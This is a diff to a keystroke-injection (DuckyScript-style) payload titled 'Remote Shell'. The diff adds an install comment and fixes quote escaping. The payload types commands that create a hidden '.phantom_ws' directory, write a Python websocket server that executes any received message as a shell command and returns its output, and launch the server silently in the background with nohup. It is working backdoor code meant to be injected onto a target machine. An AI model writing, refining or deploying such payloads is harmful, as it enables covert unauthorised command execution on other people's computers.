@@ -17,6 +17,8 @@ REM To shut down the server, use the kill command with the PID
 REM Replace 12345 with the actual PID from your 'kill 12345'
 
 REM Requirements: Homebrew/python3/websocat
+REM Python 3 and websockets library need to be installed on the systemTerminal 
+REM command 'pip3 install websockets'
 
 
 REM Title: Remote Shell
@@ -37,7 +39,7 @@ DELAY 500
 STRING mkdir ~/.phantom_ws && cd ~/.phantom_ws
 ENTER
 DELAY 500
-STRING echo 'import asyncio\nimport websockets\nimport subprocess\n\nasync def execute_command(websocket, path):\n    async for message in websocket:\n        cmd = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        cmd_output = cmd.stdout.read() + cmd.stderr.read()\n        await websocket.send(cmd_output.decode())\n\nstart_server = websockets.serve(execute_command, \"localhost\", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()' > server.py
+STRING echo 'import asyncio\nimport websockets\nimport subprocess\n\nasync def execute_command(websocket, path):\n    async for message in websocket:\n        cmd = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)\n        cmd_output = cmd.stdout.read() + cmd.stderr.read()\n        await websocket.send(cmd_output.decode())\n\nstart_server = websockets.serve(execute_command, "localhost", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()' > server.py
 ENTER
 DELAY 500
 STRING nohup python3 server.py > /dev/null 2>&1 &
